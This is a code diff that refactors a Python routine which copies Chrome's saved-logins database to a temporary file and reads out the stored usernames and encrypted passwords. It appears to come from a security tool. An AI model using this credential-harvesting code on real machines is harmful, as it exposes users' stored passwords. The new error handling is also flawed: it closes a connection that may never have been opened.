@@ -2,12 +2,13 @@ import logging
 import os
 import shutil
 import sqlite3
+import tempfile
 from collections.abc import Callable, Iterator
+from contextlib import contextmanager
 from pathlib import Path
 
 logger = logging.getLogger(__name__)
 
-DB_TEMP_PATH = "/tmp/chrome.db"
 DB_SQL_STATEMENT = "SELECT username_value,password_value FROM logins"
 
 ExtractedCredentialPair = tuple[str, bytes]
@@ -18,24 +19,27 @@ def get_credentials_from_database(
     database_path: Path,
 ) -> Iterator[ExtractedCredentialPair]:
     if database_path.is_file():
-        try:
-            shutil.copyfile(database_path, DB_TEMP_PATH)
-
-            conn = sqlite3.connect(DB_TEMP_PATH)
-        except Exception:
-            logger.exception("Error encounter while connecting to " f"database: {database_path}")
-            os.remove(DB_TEMP_PATH)
-            return
-
-        try:
-            yield from _process_login_data(conn)
-        except Exception:
-            logger.exception("Error encountered while processing " f"database {database_path}")
-        finally:
-            conn.close()
-            os.remove(DB_TEMP_PATH)
+        with temporary_file() as temporary_database_path:
+            shutil.copy(database_path, temporary_database_path)
+            yield from _extract_login_data(temporary_database_path)
 
 
-def _process_login_data(connection: sqlite3.Connection) -> Iterator[ExtractedCredentialPair]:
-    for user, password in connection.execute(DB_SQL_STATEMENT):
-        yield user, password
+@contextmanager
+def temporary_file() -> Iterator[Path]:
+    file, path = tempfile.mkstemp()
+    os.close(file)
+    try:
+        yield Path(path)
+    finally:
+        os.remove(path)
+
+
+def _extract_login_data(database_path: Path) -> Iterator[ExtractedCredentialPair]:
+    try:
+        conn = sqlite3.connect(database_path)
+        for user, password in conn.execute(DB_SQL_STATEMENT):
+            yield user, password
+    except Exception:
+        logger.exception("Error encounter while connecting to " f"database: {database_path}")
+    finally:
+        conn.close()
